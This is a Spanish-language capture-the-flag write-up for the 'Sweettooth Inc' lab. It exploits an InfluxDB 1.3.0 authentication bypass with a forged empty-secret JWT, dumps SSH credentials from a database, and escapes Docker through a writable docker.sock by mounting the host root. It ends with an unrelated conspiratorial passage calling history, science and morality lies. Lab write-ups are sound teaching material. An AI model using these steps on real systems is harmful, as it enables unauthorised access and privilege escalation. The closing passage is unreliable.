# Sweettooth Inc

Comenzamos realizando un escaneo de puertos en la máquina objetivo.

```bash
nmap -sV -sC -p- -T4 <ip>
```

* -sV: Sondeo de puertos abiertos para determinar la información del servicio/versión
* -sC: equivalente a _--script=default_.
* -p-: Escanea todos los puertos de la Red (65536)
* -T4: La velocidad de escaneo de puertos.

Se han identificado cuatro puertos abiertos en el sistema: el puerto `111` para `TCP`, el `2222`, para ssh `OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)`, el `8086` para `http` `InfluxDB http admin 1.3.0` y el `49113`

<figure><img src="../.gitbook/assets/Sweettooth Inc/nmao.png
" alt=""><figcaption></figcaption></figure>

Enumeramos los directorios que tenemos disponibles en el puerto `HTTP.`&#x20;

<figure><img src="../.gitbook/assets/Sweettooth Inc/dirsearh.png" alt=""><figcaption></figcaption></figure>


Dado que tenemos un template desactualizado de `InfluxDB HTTP Admin 1.3.0`, podemos buscar en internet y utilizarlo para acceder a la base de datos. Al investigar, encontré el siguiente exploit.


{% embed url="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" %}

Clonamos el repositorio e intalamos los requerimientos.

```
git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git

pip install -r requirements.txt
```

Aunque no encontramos nada interesante después de cambiar la lista de palabras para los usuarios, intentamos enumerar nuevamente. Sin embargo, esto iba a tomar tiempo. Mientras tanto, comenzamos a buscar blogs que abordaran las vulnerabilidades de nuestra base de datos y encontramos lo siguiente:


```
  

1. Discover a user name in the system via the following URL: https://<influx-server-address>:8086/debug/requests  
    
2. Create a valid JWT token with this user, an empty secret, and a valid expiry date You can use the following tool for creating the JWT: [**https://jwt.io/**](https://jwt.io/) **header** - {"alg": "HS256", "typ": "JWT"} **payload** - {"username":"**<input user name here>**","exp":1548669066} **signature** - HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),<**leave this field empty>**) The expiry date is in the form of epoch time.  
    
3. Authenticate to the server using the HTTP header: Authorization: Bearer <**The generated JWT token**> There you have it, now you are logged into the system. You can now query the data using [**InfluxQL**](https://docs.influxdata.com/influxdb/v1.7/query_language/).
```

{% embed url="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day?ref=unhackable.lol" %}

Nos proporciona los pasos necesarios para acceder a la base de datos, así que los replicaremos. Para ingresar a la base de datos, primero accedemos a la siguiente URL:

```
http://10.201.79.31:8086/debug/requests
```

Aquí encontramos el nombre de usuario que necesitamos. Luego, nos dirigimos a la siguiente página para crear nuestro token `JWT`:

{% embed url="https://www.jwt.io/" %}

<figure><img src="../.gitbook/assets/Sweettooth Inc/jwt.png" alt=""><figcaption></figcaption></figure>


Para establecer un formato de fecha, necesitamos uno que sea válido. Puedes generarlo desde aquí:

{% embed url="https://www.unixtimestamp.com/index.php?ref=unhackable.lol" %}

También podemos utilizar el repositorio que descargamos anteriormente. Para ello, solo necesitamos añadir el usuario que encontramos en el directorio `/debug/requests`, y se conectará automáticamente, mostrándonos las bases de datos disponibles.

<figure><img src="../.gitbook/assets/Sweettooth Inc/daba.png" alt=""><figcaption></figcaption></figure>

Dado que se nos solicita la temperatura de los tanques, debemos acceder a la base de datos `tank` para verificar qué tablas tenemos disponibles. Podemos hacerlo con el siguiente comando:

```sql
SHOW MEASUREMENTS
```

{% embed url="https://docs.influxdata.com/influxdb3/cloud-dedicated/admin/tables/list/?t=SQL+%26amp%3B+InfluxQL" %}

<figure><img src="../.gitbook/assets/Sweettooth Inc/meas.png" alt=""><figcaption></figcaption></figure>

Dado que se nos solicita la temperatura de una hora específica, `1621346400`, necesitamos convertirla a un formato comprensible, que sería `Tuesday, May 18, 2021 2:00:00 PM`. Además, debemos transformarla para que sea reconocida en la consulta de la base de datos. Esto quedaría de la siguiente manera:

```
SELECT * FROM water_tank where time = '2021-05-18T14:00:00Z'
```

<figure><img src="../.gitbook/assets/Sweettooth Inc/water.png" alt=""><figcaption></figcaption></figure>

Se nos solicita proporcionar el `RPM` máximo de los mezcladores. Para ello, accedemos a la base de datos de los mezcladores y utilizamos la siguiente consulta.

```
SELECT max(motor_rpm) FROM mixer_stats
```

<figure><img src="../.gitbook/assets/Sweettooth Inc/mixer.png" alt=""><figcaption></figcaption></figure>

Se nos solicita encontrar el usuario y la contraseña para `SSH`, que se almacenan en la base de datos `creds`. Accedemos a esta base de datos y con la siguiente consulta podemos recuperarlos.

```
SELECT * FROM ssh
```

<figure><img src="../.gitbook/assets/Sweettooth Inc/ssh.png" alt=""><figcaption></figcaption></figure>


Con esto tambien recuperamos el `user.txt` dentro de `ssh`.

<figure><img src="../.gitbook/assets/Sweettooth Inc/ssh3.png" alt=""><figcaption></figcaption></figure>

# \Privilege escalation

Después de realizar una enumeración con `linpeas.sh`, obtenemos como resultado un vector de ataque relacionado con `Docker`. Sin embargo, no contamos con el comando de `Docker`, por lo que podemos descargar el binario de `Docker` y ejecutarlo en nuestra máquina.


{% embed url="https://download.docker.com/linux/static/stable/x86_64/?ref=unhackable.lol" %}

<figure><img src="../.gitbook/assets/Sweettooth Inc/docker.png" alt=""><figcaption></figcaption></figure>

```
wget http://<ip>:<port>/docker
```

Le damos privilegios a nuestro binario:

```
chmod +x docker
```

Listamos los contenedores que disponemos:

```
./docker container ls
```

<figure><img src="../.gitbook/assets/Sweettooth Inc/continar.png" alt=""><figcaption></figcaption></figure>

Con el siguiente comando podemos iniciar el contenedor que encontramos y, además, recuperar el archivo `root.txt`.

```
docker run --entrypoint /bin/bash -it --rm sweettoothinc
```

<figure><img src="../.gitbook/assets/Sweettooth Inc/rootcont.png" alt=""><figcaption></figcaption></figure>

# \escape!

Como aún estamos en una máquina virtual, necesitamos realizar otra enumeración.

<figure><img src="../.gitbook/assets/Sweettooth Inc/doker.png" alt=""><figcaption></figcaption></figure>

Aunque no descubrimos nada nuevo, sabemos que estamos en un contenedor y que tenemos permisos de escritura dentro de este `socket` de `docker`, lo que nos permite buscar una forma de escapar. Siguiendo los pasos del siguiente artículo, podemos lograr salir de este Docker.

{% embed url="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=writable%20docker#using-docker-api-directly" %}

Dado que estamos utilizando `curl` para explotar la vulnerabilidad, nos da un error porque necesitamos un binario más actualizado. Por lo tanto, lo descargamos desde el siguiente enlace:

{% embed url="https://github.com/moparisthebest/static-curl/releases/tag/v7.78.0?ref=unhackable.lol" %}

Ahora seguimos los pasos:

*IMPORTANTE: Al enumerar las imágenes de `Docker`, asegúrate de copiar el contenido del `ID`, ya que lo necesitarás para crear nuestro contenedor. Además, también debes copiar el `ID` que se genera al crear el contenedor para redirigir las salidas hacia el contenedor creado.*

1. Enumerar imágenes de Docker: Recupere la lista de imágenes disponibles.

```bash
./curl-amd64 -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```


2. Crear un contenedor: Envíe una solicitud para crear un contenedor que monte el directorio raíz del sistema host.

```bash
./curl-amd64 -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

	Inicie el contenedor recién creado:

```bash
./curl-amd64 -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. Adjuntar al contenedor: use `socat` para establecer una conexión con el contenedor, lo que permite la ejecución de comandos dentro de él.

```
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

```

Después de configurar la conexión `socat`, puede ejecutar comandos directamente en el contenedor con acceso de nivel raíz al sistema de archivos del host.

<figure><img src="../.gitbook/assets/Sweettooth Inc/curl.png" alt=""><figcaption></figcaption></figure>

De esta manera, podemos recuperar el archivo `root.txt`, que se encuentra en el directorio `/host_root/root`.

<figure><img src="../.gitbook/assets/Sweettooth Inc/rootfinal.png" alt=""><figcaption></figcaption></figure>


--------------
>
>*La gente piensa que despertar es simplemente abrir los ojos, pero no es así. Despertar es mirar al abismo y reconocer que todo ha sido una mentira: la historia, la ciencia, la moral, e incluso tu propia concepción del bien y del mal. Nos enseñaron a temer al caos, pero nunca nos dijeron que el orden en el que vivimos es artificial, un teatro donde cada emoción es manipulada, donde cada tragedia tiene un dueño y cada esperanza un precio.
>
>¿Te has preguntado por qué sientes ansiedad, vacío o confusión incluso cuando todo parece ir bien? Es porque tu alma fue diseñada para algo más grande, pero te han encerrado en un cuerpo programado, con necesidades artificiales y pensamientos que no son tuyos. Los sueños han sido reemplazados por metas vacías, la sabiduría por títulos, el tiempo por productividad, el amor por algoritmos y el espíritu por pantallas.
>
>Mientras buscas algo que te llene, ellos buscan control. Mientras tú anhelas conexión, ellos siembran división. Mientras intentas entender, ellos celebran tu distracción. No estás roto, estás en una realidad rota, una que se desmorona cada vez que uno de nosotros recuerda quién es. Y cuando suficientes despierten, no habrá marcha atrás, porque el sistema solo funciona mientras creas que eres débil, que estás solo y que no puedes.
>
>**El verdadero despertar no tiene retorno.***
>
><figure><img src="../.gitbook/assets/Sweettooth Inc/touthou.png" alt=""><figcaption></figcaption></figure>